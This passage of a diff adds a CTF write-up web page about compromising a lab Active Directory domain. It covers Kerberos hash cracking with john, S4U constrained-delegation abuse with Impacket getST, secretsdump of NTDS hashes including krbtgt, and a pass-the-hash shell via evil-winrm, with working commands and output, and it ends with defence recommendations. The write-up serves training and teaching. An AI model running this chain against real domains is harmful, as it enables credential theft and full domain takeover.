+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash_crocc
+
+resetpassword    (?)
+1g 0:00:00:00 DONE</code></pre>
+                </div>
+
+                <p>
+                    The password for the <code>password-reset</code> account is <strong><code>resetpassword</code></strong> — a delightfully ironic choice given the account's name. With these credentials in hand, we now have access to a service account configured with constrained delegation, which is our escalation path to domain admin.
+                </p>
+
+                <div class="callout callout-success">
+                    <div class="callout-icon"><i class="bi bi-check-circle"></i></div>
+                    <div class="callout-content">
+                        <strong>Credentials Obtained</strong>
+                        <code>COOCTUS.CORP/password-reset:resetpassword</code> — Service account with constrained delegation to <code>oakley/DC.COOCTUS.CORP</code> with protocol transition enabled.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 6: Constrained Delegation Abuse -->
+            <section id="delegation" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">6</div>
+                    <h2>Constrained Delegation Abuse (S4U)</h2>
+                </div>
+                <p>
+                    Before exploiting the delegation, we first confirm the exact delegation configuration using Impacket's <code>findDelegation</code> tool. This reveals the full scope of what the <code>password-reset</code> account is trusted to delegate to, and critically, whether protocol transition is enabled.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">impacket-findDelegation COOCTUS.CORP/password-reset:resetpassword \
+  -dc-ip 10.10.175.192
+
+AccountName      DelegationType                      DelegationRightsTo
+--------------   ----------------------------------  -------------------
+password-reset   Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP
+password-reset   Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP
+password-reset   Constrained w/ Protocol Transition  oakley/DC
+password-reset   Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS
+password-reset   Constrained w/ Protocol Transition  oakley/DC/COOCTUS</code></pre>
+                </div>
+
+                <p>
+                    The key phrase here is <strong>"Constrained w/ Protocol Transition"</strong>. This means the account can use S4U2Self to get a forwardable TGS for itself on behalf of any user, then use S4U2Proxy to exchange that for a service ticket to the delegated SPN — all without knowing the impersonated user's password. We exploit this by requesting a ticket for the <code>Administrator</code> account.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">impacket-getST -spn oakley/DC.COOCTUS.CORP \
+  -impersonate Administrator \
+  "COOCTUS.CORP/password-reset:resetpassword" \
+  -dc-ip 10.10.175.192
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache</code></pre>
+                </div>
+
+                <p>
+                    The attack succeeds and produces an <code>Administrator.ccache</code> file containing a Kerberos service ticket that authenticates as the Domain Administrator. We set the <code>KRB5CCNAME</code> environment variable to point to this cache file, ensuring all subsequent Kerberos tools use the impersonated ticket.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash"># Add DC to hosts file for Kerberos resolution
+echo "10.10.175.192   DC.COOCTUS.CORP" >> /etc/hosts
+
+# Load the ticket into memory
+export KRB5CCNAME=Administrator.ccache
+
+# Verify ticket
+klist
+# Default principal: Administrator@COOCTUS.CORP
+# Service: oakley/DC/COOCTUS@COOCTUS.CORP</code></pre>
+                </div>
+
+                <div class="callout callout-warning">
+                    <div class="callout-icon"><i class="bi bi-exclamation-triangle"></i></div>
+                    <div class="callout-content">
+                        <strong>S4U Attack Chain</strong>
+                        <strong>S4U2Self</strong> allows a service to obtain a TGS ticket to itself on behalf of a user — no password needed. <strong>S4U2Proxy</strong> then exchanges that ticket for a TGS to another service the account is allowed to delegate to. With protocol transition enabled, the entire chain works without the victim user ever authenticating to the service.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 7: Secrets Dump -->
+            <section id="secrets-dump" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">7</div>
+                    <h2>Domain Secrets Extraction</h2>
+                </div>
+                <p>
+                    With the Administrator's Kerberos ticket cached, we can use Impacket's <code>secretsdump.py</code> to remotely extract all credential material from the Domain Controller. This includes the local SAM database, LSA secrets, and the full NTDS.DIT domain password database.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">secretsdump.py -k -no-pass DC.COOCTUS.CORP</code></pre>
+                </div>
+
+                <p>
+                    The dump is comprehensive. From the local SAM we get the local Administrator hash <code>7dfa0531d73101ca080c7379a9bff1c7</code>, while the NTDS.DIT extraction reveals the domain Administrator hash <code>add41095f1fb0405b32f70a489de022d</code>. All domain user hashes including the Crocc Crew's <code>admCroccCrew</code> account are exposed.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">text</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-plain">[*] Dumping Domain Credentials (DRSUAPI method)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
+COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
+COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
+COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::</code></pre>
+                </div>
+
+                <p>
+                    Additionally, the dump extracts Kerberos encryption keys (AES256, AES128, DES) for all accounts, DPAPI backup keys, and the machine account password. This gives us persistent access even if passwords are rotated — the krbtgt hash enables Golden Ticket attacks, and the DPAPI keys can decrypt any user's stored credentials.
+                </p>
+
+                <div class="callout callout-danger">
+                    <div class="callout-icon"><i class="bi bi-x-octagon"></i></div>
+                    <div class="callout-content">
+                        <strong>Full Domain Compromise</strong>
+                        With the NTDS.DIT dump, the domain is completely owned. The <code>krbtgt</code> hash enables Golden Ticket creation for persistence, the Administrator NTLM hash grants instant access to any domain system via Pass-the-Hash, and DPAPI keys unlock encrypted credentials across the forest.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 8: Domain Admin -->
+            <section id="domain-admin" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">8</div>
+                    <h2>Domain Admin — Shell Access</h2>
+                </div>
+                <p>
+                    Using the Administrator NTLM hash extracted from the secrets dump, we connect to the Domain Controller via WinRM using Evil-WinRM with Pass-the-Hash authentication. No plaintext password is needed — the hash alone is sufficient for full system access.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">evil-winrm -u Administrator \
+  -H add41095f1fb0405b32f70a489de022d \
+  -i 10.10.47.104
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cooctus\administrator</code></pre>
+                </div>
+
+                <p>
+                    We have a shell as <code>cooctus\administrator</code> on the Domain Controller. Navigating through the file system, we find additional flags left by the Crocc Crew in the shared folders.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">powershell</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-powershell">cd C:\Shares\Home
+ls
+
+# Mode    LastWriteTime    Length Name
+# ----    -------------    ------ ----
+# d-----  6/8/2021 12:42PM       Home
+
+cd C:\Shares\Home
+ls
+
+# -a----  6/8/2021 12:38PM  28  priv-esc-2.txt
+# -a----  6/7/2021  8:08PM  22  priv-esc.txt
+# -a----  6/7/2021  8:14PM  17  user.txt</code></pre>
+                </div>
+
+                <p>
+                    The root flag is located in the <code>C:\PerfLogs\Admin</code> directory, a classic hiding spot for CTF challenges since it's a rarely-visited system directory.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">powershell</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-powershell">cd C:\PerfLogs\Admin
+type root.txt</code></pre>
+                </div>
+
+                <div class="flag-display">
+                    <div class="flag-label">Root Flag</div>
+                    <div class="flag-value">rootflag</div>
+                </div>
+            </section>
+
+            <!-- Key Takeaways -->
+            <section id="takeaways" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">9</div>
+                    <h2>Key Takeaways</h2>
+                </div>
+
+                <div class="takeaways">
+                    <div class="takeaways-title"><i class="bi bi-trophy"></i> Lessons Learned</div>
+                    <div class="takeaways-grid">
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Kerberoasting:</span>
+                            <span class="takeaway-desc">Service accounts with SPNs are always targets. Weak passwords on service accounts like <code>password-reset</code> make offline cracking trivial with rockyou.</span>
+                        </div>
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Constrained Delegation:</span>
+                            <span class="takeaway-desc">When configured with protocol transition (S4U2Self), constrained delegation becomes a direct path to Domain Admin without needing the target user's credentials.</span>
+                        </div>
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Non-Standard SPNs:</span>
+                            <span class="takeaway-desc">The <code>oakley/DC.COOCTUS.CORP</code> SPN is unusual — IPsec/NAP service delegation. Don't overlook non-HTTP/LDAP SPNs as delegation targets.</span>
+                        </div>
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Pass-the-Hash:</span>
+                            <span class="takeaway-desc">NTLM hashes extracted from NTDS.DIT enable instant lateral movement via WinRM, SMB, and other protocols without cracking passwords.</span>
+                        </div>
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Web Info Leaks:</span>
+                            <span class="takeaway-desc">The <code>robots.txt</code> and <code>db-config.bak</code> files on IIS reveal attacker infrastructure and credentials. Always check for backup files and exposed configs.</span>
+                        </div>
+                        <div class="takeaway-item">
+                            <span class="takeaway-label">Defense Recommendations:</span>
+                            <span class="takeaway-desc">Use strong passwords for service accounts, avoid protocol transition where possible, monitor S4U ticket requests, and restrict delegation to only necessary services.</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Author Footer -->
+            <div class="author-footer">
+                <div class="author-info">
+                    <div class="author-avatar">Q</div>
+                    <div class="author-details">
+                        <div class="author-name">QA210</div>
+                        <div class="author-team">w4llz CTF Team</div>
+                    </div>
+                </div>
+                <div class="footer-links">
+                    <a href="https://github.com/Yuri08-QA210" target="_blank" class="footer-link" title="GitHub"><i class="bi bi-github"></i></a>
+                    <a href="https://w4llz.me/" target="_blank" class="footer-link" title="W4LLZ" style="color: var(--orange)"><i class="bi bi-people-fill"></i></a>
+                </div>
+            </div>
+        </main>
+
+        <!-- TOC Sidebar -->
+        <aside class="toc-sidebar">
+            <div class="toc-title">On This Page</div>
+            <ul class="toc-list">
+                <li><a href="#overview" class="toc-link active"><span class="toc-num">0</span> Attack Flow</a></li>
+                <li><a href="#recon" class="toc-link"><span class="toc-num">1</span> Reconnaissance</a></li>
+                <li><a href="#web-enum" class="toc-link"><span class="toc-num">2</span> Web Enumeration</a></li>
+                <li><a href="#smb-enum" class="toc-link"><span class="toc-num">3</span> SMB Access</a></li>
+                <li><a href="#ldap-enum" class="toc-link"><span class="toc-num">4</span> LDAP Enumeration</a></li>
+                <li><a href="#kerberoast" class="toc-link"><span class="toc-num">5</span> Kerberoasting</a></li>
+                <li><a href="#delegation" class="toc-link"><span class="toc-num">6</span> Delegation Abuse</a></li>
+                <li><a href="#secrets-dump" class="toc-link"><span class="toc-num">7</span> Secrets Dump</a></li>
+                <li><a href="#domain-admin" class="toc-link"><span class="toc-num">8</span> Domain Admin</a></li>
+                <li><a href="#takeaways" class="toc-link"><span class="toc-num">9</span> Takeaways</a></li>
+            </ul>
+        </aside>
+    </div>
+
+    <!-- Prism.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+
+    <!-- Three.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script>
+        // ── Three.js Background: Icosahedron wireframe (AD/network mesh feel) ──
+        (function() {
+            const canvas = document.getElementById('three-bg');
+            const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 4;
+
+            const group = new THREE.Group();
+            scene.add(group);
+
+            // Central icosahedron (domain controller node)
+            const icoGeo = new THREE.IcosahedronGeometry(1.4, 1);
+            const icoMat = new THREE.MeshBasicMaterial({ color: 0x3b82f6, wireframe: true, transparent: true, opacity: 0.25 });
+            const ico = new THREE.Mesh(icoGeo, icoMat);
+            group.add(ico);
+
+            // Outer ring (network nodes)
+            const ringGeo = new THREE.TorusGeometry(2.5, 0.02, 8, 64);
+            const ringMat = new THREE.MeshBasicMaterial({ color: 0x3b82f6, transparent: true, opacity: 0.15 });
+            const ring = new THREE.Mesh(ringGeo, ringMat);
+            ring.rotation.x = Math.PI / 2;
+            group.add(ring);
+
+            // Small orbiting nodes (representing domain users/services)
+            const nodeGeo = new THREE.OctahedronGeometry(0.08, 0);
+            const nodeMat = new THREE.MeshBasicMaterial({ color: 0x60a5fa, transparent: true, opacity: 0.4 });
+            const nodes = [];
+            for (let i = 0; i < 12; i++) {
+                const node = new THREE.Mesh(nodeGeo, nodeMat.clone());
+                const angle = (i / 12) * Math.PI * 2;
+                node.position.set(Math.cos(angle) * 2.5, (Math.random() - 0.5) * 0.8, Math.sin(angle) * 2.5);
+                group.add(node);
+                nodes.push({ mesh: node, angle, speed: 0.003 + Math.random() * 0.005, yOff: (Math.random() - 0.5) * 0.8 });
+            }
+
+            // Connection lines from center to nodes
+            const lineMat = new THREE.LineBasicMaterial({ color: 0x3b82f6, transparent: true, opacity: 0.08 });
+            nodes.forEach(n => {
+                const points = [new THREE.Vector3(0, 0, 0), n.mesh.position];
+                const lineGeo = new THREE.BufferGeometry().setFromPoints(points);
+                const line = new THREE.Line(lineGeo, lineMat);
+                group.add(line);
+            });
+
+            function animate() {
+                requestAnimationFrame(animate);
+                group.rotation.y += 0.002;
+                group.rotation.x = Math.sin(Date.now() * 0.0003) * 0.15;
+                ico.rotation.y += 0.003;
+                ico.rotation.z += 0.001;
+                ring.rotation.z += 0.001;
+
+                nodes.forEach(n => {
+                    n.angle += n.speed;
+                    n.mesh.position.x = Math.cos(n.angle) * 2.5;
+                    n.mesh.position.z = Math.sin(n.angle) * 2.5;
+                    n.mesh.position.y = n.yOff + Math.sin(Date.now() * 0.001 + n.angle) * 0.2;
+                    n.mesh.rotation.y += 0.02;
+                });
+
+                renderer.render(scene, camera);
+            }
+            animate();
+
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+        })();
+    </script>
+
+    <script>
+        // ── Copy Button ──
+        function copyCode(btn) {
+            const wrapper = btn.closest('.code-block-wrapper');
+            const code = wrapper.querySelector('code');
+            navigator.clipboard.writeText(code.textContent).then(() => {
+                btn.innerHTML = '<i class="bi bi-check2"></i> Copied';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="bi bi-clipboard"></i> Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // ── TOC Active Tracking ──
+        const tocLinks = document.querySelectorAll('.toc-link');
+        const sections = document.querySelectorAll('.section');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    tocLinks.forEach(l => l.classList.remove('active'));
+                    const activeLink = document.querySelector(`.toc-link[href="#${entry.target.id}"]`);
+                    if (activeLink) activeLink.classList.add('active');
+                }
+            });
+        }, { rootMargin: '-80px 0px -60% 0px', threshold: 0 });
+        sections.forEach(s => observer.observe(s));
+
+        // ── Fade-in Animation ──
+        const fadeObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, { threshold: 0.1 });
+        document.querySelectorAll('.fade-in').forEach(el => fadeObserver.observe(el));
+    </script>
+</body>
+</html>
